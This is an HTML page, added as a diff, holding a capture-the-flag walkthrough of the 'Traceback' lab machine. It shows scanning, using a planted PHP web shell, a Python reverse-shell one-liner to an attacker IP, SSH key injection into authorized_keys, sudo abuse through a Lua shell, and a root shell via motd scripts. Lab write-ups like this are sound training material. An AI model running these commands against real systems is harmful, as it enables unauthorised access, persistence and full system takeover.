@@ -1,0 +1,283 @@
+<head>
+	<!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	
+	<!-- Custom CSS -->
+	<link rel="stylesheet" type="text/css" href="../assets/static/main.css">
+</head>
+<body>
+	<div class="container">
+		<header class="header">
+			<div class="topnav-left">
+				<h1>
+					Hybryx Cyber Security
+				</h1>
+			</div>
+			<div class="topnav-right">
+				<a href="/site/">Home</a>
+				<a href="/about.html">About</a>
+			</div>
+		</header>
+	</div>
+	<div class="container">
+		<main>
+			<div class="text-center">
+<img src="../assets/traceback/traceback.png" alt="">
+</div>
+<h2>
+	NMAP
+</h2>
+<p>
+	We run the average NMAP scan.
+</p>
+<pre>
+<code>
+nmap -p- -sV traceback<br>
+</code>
+</pre>
+<div class="text-center">
+<img src="../assets/traceback/nmap.png" alt="">
+</div>
+<h2>
+	Web Server
+</h2>
+<div class="text-center">
+<img src="../assets/traceback/site.png" alt="">
+</div>
+<p>
+	This site is alternating between a black background and a white background. We see from the source code that there is an HTML comment that says "Some of the best web shells that you might need ;)" with a header of "Xh4h".
+</p>
+<div class="text-center">
+<img src="../assets/traceback/viewsource.png" alt="">
+</div>
+<p>
+	This appears to be a handle so we search for this on Google. The first result is a GitHub profile with a bio of "Software Engineer and cybersecurity researcher". This looks very promising as it is very relevant to what we just found. As we scroll through Xh4H's public repos we eventually find one called [Web-Shells](https://github.com/Xh4H/Web-Shells) with the bio of "Some of the best web shells that you might need". This is the same phrase from the website on Traceback so this is very suspicious!
+</p>
+<p>
+	This repo appears to hold a bunch of PHP web shells. Since PHP is a web language that usually hosts a PHP file as a web page endpoint,  we can try to use these PHP files as a wordlist. We will use GoBuster with the custom wordlist to scan the site.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/customWordlist.png" alt="">
+</div>
+<p>
+	Then run GoBuster with this wordlist. Note: You don’t have to use GoBuster. You can use whatever directory scanning tool you wish to use.
+</p>
+<p>
+	gobuster dir --url http://traceback --wordlist webShellWordlist.txt
+</p>
+<div class="text-center">
+<img src="../assets/traceback/gobusterResults.png" alt="">
+</div>
+<p>
+	We found that one of the PHP scripts is being hosted on the machine at /smevk.php. If we go to that extension we see the following.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/smevk.png" alt="">
+</div>
+<h2>
+	SmEvK Research
+</h2>
+<p>
+	We arrive at login screen to what appears to be a web shell. We do not know the password just yet, but we do have the source code to this page. On GitHub, we look at the source code for this PHP file and we see the following parameters set at in the PHP file.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/smevkSource.png" alt="">
+</div>
+<p>
+	Once we try these credentials on the site, we login to the site and land at this page.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/smevkHome.png" alt="">
+</div>
+<h2>
+	Initial Shell Using SmEvK
+</h2>
+<p>
+	This site has multiple sections. It appears to be a GUI based shell on the target system. We can change the current directory and it will update the list on the screen with the files that are in that directory. There is a section that allows us to enter a command and execute that command. Lets see what resources we available to try to get a reverse shell. If we run `whereis python` we see that Python3 is on the system.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/whereisPython.png" alt="">
+</div>
+<p>
+	Since we have access to Python, we can try to spawn a reverse shell.
+</p>
+<p>
+	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</p>
+<p>
+	Make sure to start a NetCat listener and to change the IP and Port number to your own information and use the following code to get a reverse shell. Execute that command.
+</p>
+<p>
+	On our NetCat session we see that we have a reverse shell as "webadmin" that is not a tty. So we us the Python shell spawn technique to get a full shell.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/initialShell.png" alt="">
+</div>
+<p>
+	Lets try to get a more stable shell by generating an SSH key and putting it into webadmin's authorized keys. First we need to generate a SSH key on our local machine. Generate a SSH key using "ssh-keygen" and save it wherever you wish. Then copy the contents of the public key.
+</p>
+<p>
+	We view all the files inside of webadmin's home directory and see that there is an .ssh folder. I know you see that juicy note.txt file. Lets ignore it for now until we get a better shell. CD to .ssh and lets our SSH key here. You can put an SSH key into this file while using this unstable web shell by redirecting STDOUT to STDIN to write to the file. You can see in the picture below that we echo the key onto the authorized_keys file and then cat the file to see that it is there.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/sshInjection.png" alt="">
+</div>
+<p>
+	Now we can SSH to the account. Make sure to specify the correct key when SSH'ing to the account.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/sshWebadmin.png" alt="">
+</div>
+<h2>
+	Lateral Movement to Sysadmin
+</h2>
+<p>
+	Now we see that there is a file in webadmin's home directory called note.txt that says the following.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/notetxt.png" alt="">
+</div>
+<p>
+	We also try one of our most common enumeration techniques of checking for sudo permissions and see that we are allowed to run /home/sysadmin/luvit as sysadmin without needed a password.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/sudo-l.png" alt="">
+</div>
+<p>
+	A quick search online shows that Luvit is a Lua shell. We will try to use this new information by using sudo with specifying the user we want to run under. Once we do this we see that drop into the Luvit repl.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/luvitShell.png" alt="">
+</div>
+<p>
+	A quick search online will show you how to execute system command with Lua. We first need to import the OS module using Lua's require statement. Then we can use that module's execute function to execute system calls. Once we do this we test its functionality by issuing a `whoami` command to see that we are running as sysadmin!
+</p>
+<div class="text-center">
+<img src="../assets/traceback/luvitCmdExec.png" alt="">
+</div>
+<p>
+	Now we can use this environment to get a move to sysadmin's account. We already have an SSH key on the system so lets try to use this key to access sysadmin's account. We can use ls to see that there is already an authorized_keys file on sysadmin's account.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/luvit_sysadmin_ssh_check.png" alt="">
+</div>
+<p>
+	We see that we are unable to do read webmin's authorized_keys from this shell. So drop out of the Lua shell and copy the SSH key to /tmp where sysadmin will be able to read it from. In webadmin's .ssh file, `cat authorized_keys > /tmp/key` . Back in the Luvit shell we can see that key now located in /tmp/key. We will use this key to access sysadmin's account. We must put this key inside of sysadmin's authorized_keys file.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/sysadmin_sshkey_injection.png" alt="">
+</div>
+<p>
+	And try to SSH to sysadmin's account and we see that we are able to! Grab the user flag located in sysadmin's home profile.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/sysadmin_ssh.png" alt="">
+</div>
+<h2>
+	Privilege Escalation To Root
+</h2>
+<p>
+	After enumerating for awhile and finding nothing too interesting, we decided to view running processes using PSPY. I uploaded PSPY to the machine by starting a Python3 http server and wget'ing it.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/wget.png" alt="">
+</div>
+<p>
+	Now run PSPY and read through the results.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/PSPY.png" alt="">
+</div>
+<p>
+	After observing the output for awhile we notice that there is a command that is being run once every 60 seconds as root. Lets break down this command.
+</p>
+<ul>
+<li>
+	/bin/sh
+</li>
+<li>
+	* starting a shell script environment to execute commands
+</li>
+<li>
+	-c
+</li>
+<li>
+	* From the man page, "Read commands from the command string operand instead of from standard input". This just means where sending the commands as parameters instead of starting an interactive terminal that will accept STDIN
+</li>
+<li>
+	sleep 30
+</li>
+<li>
+	* sleep for 30 seconds
+</li>
+<li>
+	/bin/cp
+</li>
+<li>
+	* invoke the copy binary
+</li>
+<li>
+	/var/backups/.update-motd.d/*
+</li>
+<li>
+	* all files from /var/backups/.update-motd.d/
+</li>
+<li>
+	/etc/update-motd.d/
+</li>
+<li>
+	* destination for all files
+</li>
+</ul>
+<p>
+	If we examine PSPY we will also see the following results whenever we start a new SSH session. Note: you will need to initiate the SSH session from another terminal as we are viewing PSPY on our first SSH session.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/pspy_ssh.png" alt="">
+</div>
+<p>
+	This is running the "run-parts" binary with the parameter of /etc/update-motd.d. Since we know that those files are executable, whenever we SSH to the system, all the files inside of /etc/update-motd.d will be executed as root.
+</p>
+<p>
+	We know that the Python3 reverse shell works, as we used it to get initial foothold, so we will use the same idea to try to get a root shell. We could use echo to push that string onto that file but we need to escape a lot of characters to ensure that it will work correctly. I find it easier to use Base64 as we don’t have to worry about any escaping of special characters.
+</p>
+<p>
+	On your local system, open a text file and paste/edit in your Python3 reverse shell.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/root_reverse_shell.png" alt="">
+</div>
+<p>
+	Then encode this string in Base64 by redirecting the STDOUT of cat to the STDIN of Base64 to get the Base64 representation of this string.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/python_motd.png" alt="">
+</div>
+<p>
+	Copy this new string that we will use this on the target system. Make sure that you are in /etc/update-motd.d. Since this file gets overwritten every 30 seconds we will need to be quick. Start your NetCat listener and have your other SSH session ready to execute to launch the payload. We will use redirection to take this Base64 string, decode it back to ASCII, and then append it to the 00-header file.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/echo_to_motd.png" alt="">
+</div>
+<p>
+	Now quick! Go launch your second SSH session and check your NetCat listener to see if you have a root shell. You should see that you have a root reverse shell.
+</p>
+<div class="text-center">
+<img src="../assets/traceback/root_shell.png" alt="">
+</div>
+<p>
+	Grab the root flag and your set to jet!
+</p>
+
+		</main>
+	</div>
+	<div class="container">
+		<footer class="footer">
+			
+		</footer>
+	</div>
+</body>
